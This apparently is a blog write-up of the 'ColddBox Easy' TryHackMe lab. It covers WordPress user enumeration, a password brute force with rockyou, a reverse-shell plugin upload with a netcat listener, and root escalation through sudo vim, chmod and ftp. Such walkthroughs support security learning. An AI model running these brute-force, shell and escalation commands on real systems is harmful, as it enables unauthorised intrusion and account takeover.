::: {}
# ColddBox Easy Tryhackme Writeup {#colddbox-easy-tryhackme-writeup .p-name}
:::

::: {.section .p-summary field="subtitle"}
This is a Writeup of Tryhackme room "ColddBox Easy"
:::

:::::::: {.section .e-content field="body"}
::::::: {#7d4c .section .section .section--body .section--first .section--last}
::: section-divider

------------------------------------------------------------------------
:::

::::: section-content
:::: {.section-inner .sectionLayout--insetColumn}
### ColddBox Easy Tryhackme Writeup {#fe40 .graf .graf--h3 .graf--leading .graf--title name="fe40"}

**This is a Writeup of Tryhackme room "ColddBox Easy"**

<figure id="f869" class="graf graf--figure graf-after--p">
<img
src="https://cdn-images-1.medium.com/max/800/0*yBGtBwnRSVbU-6WX.png"
class="graf-image" data-image-id="0*yBGtBwnRSVbU-6WX.png"
data-width="496" data-height="290" data-is-featured="true" />
</figure>

**Difficulty level**: Easy\
**Aim**: Hack this machine and obtain the *user* and *root* flags.

**THM:**
[https://www.tryhackme.com/room/colddboxeasy](https://www.tryhackme.com/room/colddboxeasy){.markup--anchor
.markup--p-anchor
data-href="https://www.tryhackme.com/room/colddboxeasy"
rel="noopener ugc nofollow noopener" target="_blank"}

**VulnHub:**
[https://www.vulnhub.com/entry/colddbox-easy,586/](https://www.vulnhub.com/entry/colddbox-easy,586/){.markup--anchor
.markup--p-anchor
data-href="https://www.vulnhub.com/entry/colddbox-easy,586/"
rel="noopener ugc nofollow noopener" target="_blank"}

An easy level machine with multiple ways to escalate privileges.

### Information Gathering {#0820 .graf .graf--h3 .graf-after--p name="0820"}

**Target:** 10.10.196.79 in my case

<figure id="a8f3" class="graf graf--figure graf-after--p">
<img
src="https://cdn-images-1.medium.com/max/800/0*xP6GjQkZcVKZcZ1n.png"
class="graf-image" data-image-id="0*xP6GjQkZcVKZcZ1n.png"
data-width="561" data-height="252" />
</figure>

and then a further scan to run default scripts and version detection on
the discovered ports:

``` {#c7e4 .graf .graf--pre .graf-after--p .graf--preV2 code-block-mode="1" spellcheck="false" code-block-lang="css"}
nmap -sC -sV -vvv -p 80,4512 10.10.196.79
```

<figure id="6c82" class="graf graf--figure graf-after--pre">
<img
src="https://cdn-images-1.medium.com/max/800/0*92DgwmxT8_5TDaH5.png"
class="graf-image" data-image-id="0*92DgwmxT8_5TDaH5.png"
data-width="875" data-height="341" />
</figure>

From this we can see the following ports and services:

- [port 80/tcp --- HTTP --- (Apache httpd 2.4.18 --- running a WordPress
  blog)]{#d55b}
- [port 4512/tcp --- SSH --- (OpenSSH 7.2p2)]{#b339}

### Enumeration {#26a2 .graf .graf--h3 .graf-after--li name="26a2"}

Viewing the webpage in the browser confirms WordPress is in use.

<figure id="6ae1" class="graf graf--figure graf-after--p">
<img
src="https://cdn-images-1.medium.com/max/800/0*6gScvrjDIiD6bHOP.png"
class="graf-image" data-image-id="0*6gScvrjDIiD6bHOP.png"
data-width="875" data-height="382" />
</figure>

**wpscan** can be used to enumerate WordPress for users, plugins, themes
etc:

``` {#9c1d .graf .graf--pre .graf-after--p .graf--preV2 code-block-mode="1" spellcheck="false" code-block-lang="cpp"}
wpscan --url http://10.10.196.79 -e
```

WordPress theme in use is ***twentyfifteen***:

<figure id="7716" class="graf graf--figure graf-after--p">
<img
src="https://cdn-images-1.medium.com/max/800/0*bSJ8aRfafE0kll20.png"
class="graf-image" data-image-id="0*bSJ8aRfafE0kll20.png"
data-width="802" data-height="282" />
</figure>

3 valid users were identified:

<figure id="1df7" class="graf graf--figure graf-after--p">
<img
src="https://cdn-images-1.medium.com/max/800/0*evyOXf-d_sIZFGcQ.png"
class="graf-image" data-image-id="0*evyOXf-d_sIZFGcQ.png"
data-width="656" data-height="363" />
</figure>

We can attempt to brute-force the password for these users with the
*rockyou.txt* wordlist:

``` {#b354 .graf .graf--pre .graf-after--p .graf--preV2 code-block-mode="1" spellcheck="false" code-block-lang="bash"}
wpscan --url http://10.10.196.79/ -U philip,c0ldd,hugo -P /usr/share/wordlists/rockyou.txt
```

<figure id="d4e7" class="graf graf--figure graf-after--pre">
<img
src="https://cdn-images-1.medium.com/max/800/0*jTC_lIxLOO1XjS60.png"
class="graf-image" data-image-id="0*jTC_lIxLOO1XjS60.png"
data-width="663" data-height="156" />
</figure>

Success! We have found the password for ***c0ldd*.**

### Gaining Access {#e2ed .graf .graf--h3 .graf-after--p name="e2ed"}

We can now log in to WordPress with the above credentials.

``` {#631f .graf .graf--pre .graf-after--p .graf--preV2 code-block-mode="1" spellcheck="false" code-block-lang="bash"}
http://10.10.196.79/wp-login.php
```

<figure id="ad73" class="graf graf--figure graf-after--pre">
<img
src="https://cdn-images-1.medium.com/max/800/0*4NZ-dZEX4tEaZt1G.png"
class="graf-image" data-image-id="0*4NZ-dZEX4tEaZt1G.png"
data-width="367" data-height="403" />
</figure>

<figure id="40d8" class="graf graf--figure graf-after--figure">
<img
src="https://cdn-images-1.medium.com/max/800/0*SzXTFCOf3dIkhXeG.png"
class="graf-image" data-image-id="0*SzXTFCOf3dIkhXeG.png"
data-width="845" data-height="454" />
</figure>

Create a plugin for Reverse shell

<figure id="8b7e" class="graf graf--figure graf-after--p">
<img
src="https://cdn-images-1.medium.com/max/800/0*4GNCBlkUeDDOcBNC.png"
class="graf-image" data-image-id="0*4GNCBlkUeDDOcBNC.png"
data-width="679" data-height="308" />
</figure>

compressed into zip file

<figure id="0809" class="graf graf--figure graf-after--p">
<img
src="https://cdn-images-1.medium.com/max/800/0*lF4_CkL-ywAIjWgc.png"
class="graf-image" data-image-id="0*lF4_CkL-ywAIjWgc.png"
data-width="618" data-height="146" />
</figure>

Once we get it zipped, we move to the WordPress UI. Under Plugins, we
select Add New:

<figure id="a114" class="graf graf--figure graf-after--p">
<img
src="https://cdn-images-1.medium.com/max/800/0*qYEV5W71jG991_AS.png"
class="graf-image" data-image-id="0*qYEV5W71jG991_AS.png"
data-width="434" data-height="330" />
</figure>

Select Upload Plugin:

<figure id="11c4" class="graf graf--figure graf-after--p">
<img
src="https://cdn-images-1.medium.com/max/800/0*FoL8rqZ4co_YDKvo.png"
class="graf-image" data-image-id="0*FoL8rqZ4co_YDKvo.png"
data-width="449" data-height="272" />
</figure>

We browse for our newly created plugin:

<figure id="ef2b" class="graf graf--figure graf-after--p">
<img
src="https://cdn-images-1.medium.com/max/800/0*aNdUv7f41cKaNfut.png"
class="graf-image" data-image-id="0*aNdUv7f41cKaNfut.png"
data-width="641" data-height="163" />
</figure>

Now start netcat shell

``` {#5bf8 .graf .graf--pre .graf-after--p .graf--preV2 code-block-mode="1" spellcheck="false" code-block-lang="yaml"}
nc -lvp 4444
```

<figure id="0b2b" class="graf graf--figure graf-after--pre">
<img
src="https://cdn-images-1.medium.com/max/800/0*H6v7Goj_7R2GowFz.png"
class="graf-image" data-image-id="0*H6v7Goj_7R2GowFz.png"
data-width="333" data-height="404" />
</figure>

click on activate to get shell

<figure id="1081" class="graf graf--figure graf-after--p">
<img
src="https://cdn-images-1.medium.com/max/800/0*auH9Y91-nZ7nThFz.png"
class="graf-image" data-image-id="0*auH9Y91-nZ7nThFz.png"
data-width="607" data-height="174" />
</figure>

BOOM ! we got shell

The database user and password can then be obtained from the
*config.php* file:

<figure id="630d" class="graf graf--figure graf-after--p">
<img
src="https://cdn-images-1.medium.com/max/800/0*pmAO7e7JvwDDgSki.png"
class="graf-image" data-image-id="0*pmAO7e7JvwDDgSki.png"
data-width="848" data-height="125" />
</figure>

We can upgrade this to a fully interactive shell by running:

``` {#e696 .graf .graf--pre .graf-after--p .graf--preV2 code-block-mode="1" spellcheck="false" code-block-lang="bash"}
python3 -c 'import pty; pty.spawn("/bin/bash")'
export TERM=xterm
Ctrl + Zstty raw -echo; fg   (from local terminal)
<enter>
```

<figure id="5a5b" class="graf graf--figure graf-after--pre">
<img
src="https://cdn-images-1.medium.com/max/800/0*1Vz602QMBWOcy6g1.png"
class="graf-image" data-image-id="0*1Vz602QMBWOcy6g1.png"
data-width="840" data-height="193" />
</figure>

Login with credential

<figure id="2fd9" class="graf graf--figure graf-after--p">
<img
src="https://cdn-images-1.medium.com/max/800/0*Pf-A1rTCi17o-b9W.png"
class="graf-image" data-image-id="0*Pf-A1rTCi17o-b9W.png"
data-width="566" data-height="171" />
</figure>

The *user.txt* flag can be found in the home directory:

<figure id="8fc7" class="graf graf--figure graf-after--p">
<img
src="https://cdn-images-1.medium.com/max/800/0*x2qEjn_WYMQknX2I.png"
class="graf-image" data-image-id="0*x2qEjn_WYMQknX2I.png"
data-width="563" data-height="148" />
</figure>

The flag is encoded in Base64 format, but it is not necessary to decode
this when submitting it to THM.

Next, we can check if the user *c0ldd* has any *sudo* privileges:

### Privilege Escalation {#9e88 .graf .graf--h3 .graf-after--p name="9e88"}

<figure id="63ba" class="graf graf--figure graf-after--h3">
<img
src="https://cdn-images-1.medium.com/max/800/0*GszICKeUZIKnaFV5.png"
class="graf-image" data-image-id="0*GszICKeUZIKnaFV5.png"
data-width="783" data-height="297" />
</figure>

*c0ldd* has sudo privileges for **vim, chmod** and **ftp.**

There are multiple options available here...

**Privilege Escalation via /usr/bin/vim:**

[https://gtfobins.github.io/gtfobins/vim/#sudo](https://gtfobins.github.io/gtfobins/vim/#sudo){.markup--anchor
.markup--p-anchor
data-href="https://gtfobins.github.io/gtfobins/vim/#sudo"
rel="noopener ugc nofollow noopener" target="_blank"}

``` {#c94f .graf .graf--pre .graf-after--p .graf--preV2 code-block-mode="1" spellcheck="false" code-block-lang="bash"}
sudo vim -c ':!/bin/sh'
<enter>
```

<figure id="2e41" class="graf graf--figure graf-after--pre">
<img
src="https://cdn-images-1.medium.com/max/800/0*PI_Xx0P3EQkRak-u.png"
class="graf-image" data-image-id="0*PI_Xx0P3EQkRak-u.png"
data-width="533" data-height="178" />
</figure>

**Privilege Escalation via /usr/bin/chmod:**

[https://gtfobins.github.io/gtfobins/chmod/#sudo](https://gtfobins.github.io/gtfobins/chmod/#sudo){.markup--anchor
.markup--p-anchor
data-href="https://gtfobins.github.io/gtfobins/chmod/#sudo"
rel="noopener ugc nofollow noopener" target="_blank"}

<figure id="42a4" class="graf graf--figure graf-after--p">
<img
src="https://cdn-images-1.medium.com/max/800/0*bfob2xGhHg9hvDOb.png"
class="graf-image" data-image-id="0*bfob2xGhHg9hvDOb.png"
data-width="757" data-height="149" />
</figure>

### FTP {#34b0 .graf .graf--h3 .graf-after--figure name="34b0"}

::: {#fa2b .graf .graf--mixtapeEmbed .graf-after--h3}
[**ftp \| GTFOBins**\
*It can be used to break out from restricted environments by spawning an
interactive system shell. It can
exfiltrate...*gtfobins.github.io](https://gtfobins.github.io/gtfobins/ftp/?source=post_page-----c2924bc634ce--------------------------------#sudo "https://gtfobins.github.io/gtfobins/ftp/?source=post_page-----c2924bc634ce--------------------------------#sudo"){.markup--anchor
.markup--mixtapeEmbed-anchor
data-href="https://gtfobins.github.io/gtfobins/ftp/?source=post_page-----c2924bc634ce--------------------------------#sudo"}[](https://gtfobins.github.io/gtfobins/ftp/?source=post_page-----c2924bc634ce--------------------------------#sudo){.js-mixtapeImage
.mixtapeImage .mixtapeImage--empty .u-ignoreBlock
media-id="069e63eb7a268967634168cd37d1f9df"}
:::

<figure id="3e80" class="graf graf--figure graf-after--mixtapeEmbed">
<img
src="https://cdn-images-1.medium.com/max/800/0*uxHiEnhbymzboYA8.png"
class="graf-image" data-image-id="0*uxHiEnhbymzboYA8.png"
data-width="512" data-height="196" />
</figure>

### Promote and Collaborate on Cybersecurity Insights {#5bb6 .graf .graf--h3 .graf-after--figure name="5bb6"}

We are excited to offer promotional opportunities and guest post
collaborations on our blog and website, focusing on all aspects of
cybersecurity. Whether you're an expert with valuable insights to share
or a business looking to reach a wider audience, our platform provides
the perfect space to showcase your knowledge and services. Let's work
together to enhance our community's understanding of cybersecurity!

### About the Author: {#8f7d .graf .graf--h3 .graf-after--p name="8f7d"}

[Vijay
Gupta](https://medium.com/@bevijaygupta/who-is-vijay-gupta-2ecad87f92a2){.markup--anchor
.markup--p-anchor
data-href="https://medium.com/@bevijaygupta/who-is-vijay-gupta-2ecad87f92a2"
rel="noopener" target="_blank"} is a cybersecurity enthusiast with
several years of experience in cyber security, [cyber crime forensics
investigation](https://play.google.com/store/books/details?id=VRz7EAAAQBAJ){.markup--anchor
.markup--p-anchor
data-href="https://play.google.com/store/books/details?id=VRz7EAAAQBAJ"
rel="noopener ugc nofollow noopener" target="_blank"}, and security
awareness training in schools and colleges. With a passion for
safeguarding digital environments and educating others about
cybersecurity best practices, Vijay has dedicated his career to
promoting cyber safety and resilience. Stay connected with Vijay Gupta
on various social media platforms and professional networks to access
valuable insights and stay updated on the latest cybersecurity trends.
::::
:::::
:::::::
::::::::

By [Vijay Kumar Gupta](https://medium.com/@bevijaygupta){.p-author
.h-card} on [August 22, 2024](https://medium.com/p/1ae3a74e1ed1).

[Canonical
link](https://medium.com/@bevijaygupta/colddbox-easy-tryhackme-writeup-1ae3a74e1ed1){.p-canonical}

Exported from [Medium](https://medium.com) on February 9, 2026.
